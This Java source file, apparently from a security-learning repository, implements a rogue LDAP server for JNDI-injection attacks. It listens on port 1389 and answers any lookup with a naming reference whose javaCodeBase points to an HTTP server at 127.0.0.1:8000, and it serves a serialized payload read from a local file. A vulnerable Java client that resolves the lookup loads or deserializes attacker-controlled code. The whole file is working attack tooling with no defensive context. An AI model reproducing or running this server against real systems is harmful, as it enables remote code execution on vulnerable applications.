package com.r17a.jndi.ldap;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.URL;
import java.nio.file.Files;

public class LdapSerServer {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main ( String[] args ) {
        int port = 1389;
//        if ( args.length < 1 || args[ 0 ].indexOf('#') < 0 ) {
//            System.err.println(LDAPRefServer.class.getSimpleName() + " <codebase_url#classname> [<port>]"); //$NON-NLS-1$
//            System.exit(-1);
//        }
//        else if ( args.length > 1 ) {
//            port = Integer.parseInt(args[ 1 ]);
//        }
        //TODO 序列化一个对象保存
        String url = "http://127.0.0.1:8000/";
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
//            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            // 监听，当调用jndi.lookup会自动调用
            String base = result.getRequest().getBaseDN();
            // 创建一个条目
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, IOException {
            /**
             * 序列化 存储java对象需要的属性
             * 1、javaClassName
             * 2、javaSerializedData
             * 3、javaCodeBase
             * */
            System.out.println("Send LDAP Serialize result for " + base);
            e.addAttribute("javaClassName", "foo");  //java class
            String cbstring = this.codebase.toString();
            e.addAttribute("javaCodeBase", cbstring); //class放置的位置即http服务位置
            byte[] javaSerializedData = Files.readAllBytes(new File("E:\\ser.txt").toPath()); //读取序列化文件
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$ //指定使用java命名引用
            e.addAttribute("javaSerializedData", javaSerializedData); //序列化数据
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
